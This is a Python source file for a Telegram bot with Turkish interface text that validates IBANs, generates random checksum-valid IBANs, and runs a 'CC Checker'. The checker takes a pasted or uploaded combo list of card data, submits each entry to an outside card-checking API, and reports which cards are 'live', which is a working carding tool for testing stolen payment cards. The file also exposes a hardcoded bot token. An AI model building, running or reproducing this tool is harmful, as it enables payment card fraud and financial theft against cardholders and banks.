import telebot
from telebot import types
import random
import requests
import time
import threading

TOKEN = "7818194270:AAEzLxEoao_JxR2sqMkGfJ5eALLketes6Yc"  # GÜNCELLENEN TOKEN

bot = telebot.TeleBot(TOKEN)

def is_valid_iban(iban):
    iban = iban.upper().replace(' ', '')
    if len(iban) < 15 or len(iban) > 34 or not iban.isalnum():
        return False
    iban_rearranged = iban[4:] + iban[:4]
    iban_int = ''
    for char in iban_rearranged:
        if char.isdigit():
            iban_int += char
        else:
            iban_int += str(ord(char) - 55)
    return int(iban_int) % 97 == 1

def generate_random_iban(country_code, bank_code=None):
    iban = country_code.upper()
    if bank_code:
        iban += bank_code.upper()
    else:
        iban += ''.join(random.choice('0123456789') for _ in range(4))  # Rastgele banka kodu (varsa daha uzun)
    account_number = ''.join(random.choice('0123456789') for _ in range(16))  # Rastgele hesap numarası (varsa daha uzun)
    iban += account_number
    iban_rearranged = iban[4:] + iban[:4]
    iban_int = ''
    for char in iban_rearranged:
        if char.isdigit():
            iban_int += char
        else:
            iban_int += str(ord(char) - 55)
    check_digits = str(98 - (int(iban_int) % 97)).zfill(2)  # Kontrol rakamları
    return iban[:2] + check_digits + iban[2:]  # IBAN'ı oluştur

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    iban_sorgu_button = types.InlineKeyboardButton("IBAN Sorgula", callback_data="iban_sorgu")
    iban_uret_button = types.InlineKeyboardButton("Rastgele IBAN Üret", callback_data="iban_uret")
    cc_checker_button = types.InlineKeyboardButton("CC Checker", callback_data="cc_checker")
    markup.add(iban_sorgu_button, iban_uret_button, cc_checker_button)
    bot.send_message(message.chat.id, "Selam! Ne istersin? 😈", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "iban_sorgu")
def iban_sorgu(call):
    bot.send_message(call.message.chat.id, "Lütfen IBAN'ı girin:")
    bot.register_next_step_handler(call.message, handle_iban_check)

def handle_iban_check(message):
    iban = message.text
    if is_valid_iban(iban):
        bot.send_message(message.chat.id, f"✅ {iban} geçerli bir IBAN'dır.")
    else:
        bot.send_message(message.chat.id, f"⛔ {iban} geçerli bir IBAN değildir.")

@bot.callback_query_handler(func=lambda call: call.data == "iban_uret")
def iban_uret(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    tr_button = types.InlineKeyboardButton("Türkiye", callback_data="iban_uret_tr")
    de_button = types.InlineKeyboardButton("Almanya", callback_data="iban_uret_de")
    random_button = types.InlineKeyboardButton("Rastgele Ülke", callback_data="iban_uret_random")
    markup.add(tr_button, de_button, random_button)
    bot.send_message(call.message.chat.id, "Hangi ülke için IBAN oluşturulsun?", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("iban_uret_"))
def handle_iban_uret_selection(call):
    country_code = None
    if call.data == "iban_uret_tr":
        country_code = "TR"
    elif call.data == "iban_uret_de":
        country_code = "DE"
    elif call.data == "iban_uret_random":
        country_code = random.choice(["TR", "DE", "FR", "NL"])  # Daha fazla ülke eklenebilir

    iban = generate_random_iban(country_code)
    bot.send_message(call.message.chat.id, f"🎉 Rastgele IBAN: {iban}")

@bot.callback_query_handler(func=lambda call: call.data == "cc_checker")
def cc_checker(call):
    markup = types.ForceReply(selective=False)
    bot.send_message(call.message.chat.id, "Lütfen combo dosyasını TXT olarak gönderin veya direkt olarak metin olarak yapıştırın.", reply_markup=markup)
    bot.register_next_step_handler(call.message, handle_cc_check)

def handle_cc_check(message):
    bot.send_message(message.chat.id, "Lütfen bekleyiniz...CHECK YAPILIYOR.")
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            combo_content = downloaded_file.decode('utf-8').splitlines()
            check_cc_list(message.chat.id, combo_content)
        except Exception as e:
            bot.send_message(message.chat.id, f"Dosya işlenirken hata oluştu: {e}")
    else:
        combo_content = message.text.splitlines()
        check_cc_list(message.chat.id, combo_content)

def check_cc_list(chat_id, combo_content):
    headers = {
        'authority': 'www.xchecker.cc',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.xchecker.cc',
        'referer': 'https://www.xchecker.cc/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    live_count = 0
    declined_count = 0
    results = []

    for kart in combo_content:
        kart = kart.strip()
        if not kart: continue
        url = f"https://www.xchecker.cc/api.php?cc={kart}"
        try:
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                if "live" in r.text.lower():
                    results.append(f"► {kart} | ✅")
                    live_count += 1
                else:
                    results.append(f"░ {kart} | ⛔")
                    declined_count += 1
            else:
                results.append(f"☠ {kart} | ☠")
        except requests.exceptions.RequestException as e:
            results.append(f"❗ {kart} | Error: {e}")
            time.sleep(1)

    output = "░▒▓█ ＣＣ ＣＨＥＣＫ ＲＥＳＵＬＴＳ █▓▒░\n\n"
    output += "ＬＩＶＥ ＣＡＲＤＳ:\n"
    output += "\n".join([res for res in results if "✅" in res]) + "\n\n"
    output += "ＤＥＣＬＩＮＥＤ ＣＡＲＤＳ:\n"
    output += "\n".join([res for res in results if "⛔" in res]) + "\n\n"
    output += "ＥＲＲＯＲ ＣＡＲＤＳ:\n"
    output += "\n".join([res for res in results if "☠" in res]) + "\n"

    with open("H#shtaginc CC CHECK.txt", "w", encoding="utf-8") as f:
        f.write(output)
    with open("H#shtaginc CC CHECK.txt", "rb") as f:
        bot.send_document(chat_id, f)

    bot.send_message(chat_id, f"░▒▓█ ＣＣ ＣＨＥＣＫ ＳＯＮＵÇＬＡＲＩ █▓▒░\n\nToplam Kontrol Edilen Kart: {len(combo_content)}\n\n✅ LİVE CARDS: {live_count} (Oranı: %{ (live_count/len(combo_content))*100 if len(combo_content) else 0:.2f})\n\n⛔ DEC CARDS: {declined_count} (Oranı: %{(declined_count/len(combo_content))*100 if len(combo_content) else 0:.2f})\n\n☠ ERROR CARDS: {len(combo_content) - live_count - declined_count} (Oranı: %{( (len(combo_content) - live_count - declined_count)/len(combo_content) )*100 if len(combo_content) else 0:.2f})")
    
bot.infinity_polling()
